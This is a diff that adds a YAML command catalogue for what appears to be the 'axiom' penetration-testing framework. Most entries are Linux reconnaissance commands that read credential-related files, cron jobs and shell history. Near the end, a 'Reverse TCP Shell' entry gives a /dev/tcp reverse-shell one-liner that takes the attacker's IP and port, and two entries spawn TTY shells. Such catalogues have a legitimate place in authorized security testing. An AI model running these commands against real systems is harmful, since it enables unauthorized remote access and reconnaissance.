@@ -1,0 +1,162 @@
+---
+name: bash
+description: Common default Linux command shell
+os: Linux
+ptf_module: null
+---
+commands:
+  - "List Logs":
+    - type: ["bash","standalone"]
+    - text: "ls /var/log/"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "List Administrative Logs":
+    - type: ["bash","standalone"]
+    - text: "ls /var/adm/"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "List Spooling Logs":
+    - type: ["bash","standalone"]
+    - text: "ls /var/spool/"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "View Contents of a /var/log Logfile":
+    - type: ["bash","standalone"]
+    - text: "cat /var/log/{FILE}"
+    - input: ["logfile name"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "List Users (via more)":
+    - type: ["bash","standalone"]
+    - text: "more /etc/passwd"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Show Crontab (via more)":
+    - type: ["bash","standalone"]
+    - text: "more /etc/crontab"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "List Cron Jobs":
+    - type: ["bash","standalone"]
+    - text: "ls /etc/cron.*"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "List Jobs":
+    - type: ["bash","standalone"]
+    - text: "ls /var/at/jobs"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Show DNS Settings (via more)":
+    - type: ["bash","standalone"]
+    - text: "more /etc/resolv.conf"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Show Hosts File (via more)":
+    - type: ["bash","standalone"]
+    - text: "more /etc/hosts"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "List Files (Sorted by Modification Time, Newest First)":
+    - type: ["bash","standalone"]
+    - text: "ls -lat"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "List Files Modified in the last 48 Hours":
+    - type: ["bash","standalone"]
+    - text: "find / -mtime -2 -ls"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "List Superusers":
+    - type: ["bash","autonomous"]
+    - text: "grep -v -E \"^#\" /etc/passwd | awk -F: '$3 == 0 {print $1}'"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "List Current User's History File Permissions":
+    - type: ["bash","standalone"]
+    - text: "ls -la ~/.*_history"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "List Root User's History File Permissions":
+    - type: ["bash","standalone"]
+    - text: "ls -la /root/.*_history"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Show Numbered Bash Command History":
+    - type: ["bash","standalone"]
+    - text: "history"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Show Bash Command History (via cat)":
+    - type: ["bash","standalone"]
+    - text: "cat ~/.bash_history"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Reverse TCP Shell":
+    - type: ["other","NX"]
+    - text: "bash -i >& /dev/tcp/{IPV4}/{INT} 0>&1"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Spawn a TTY Shell (via echo)":
+    - type: ["other","NX"]
+    - text: "echo os.system('/bin/bash')"
+    - input: null
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Spawn a TTY Shell (via awk)":
+    - type: ["other","NX"]
+    - text: "awk 'BEGIN {system(\"/bin/bash\")}'"
+    - input: null
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Locate World-Writable Files (including /proc)":
+    - type: ["bash","autonomous"]
+    - text: "find / -perm -2 ! -type l -ls 2>/dev/null"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Locate World-Writable Files (excluding /proc)":
+    - type: ["bash","autonomous"]
+    - text: "find / -path \"*/proc/*\" -perm -2 -type f -print 2>/dev/null"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+...
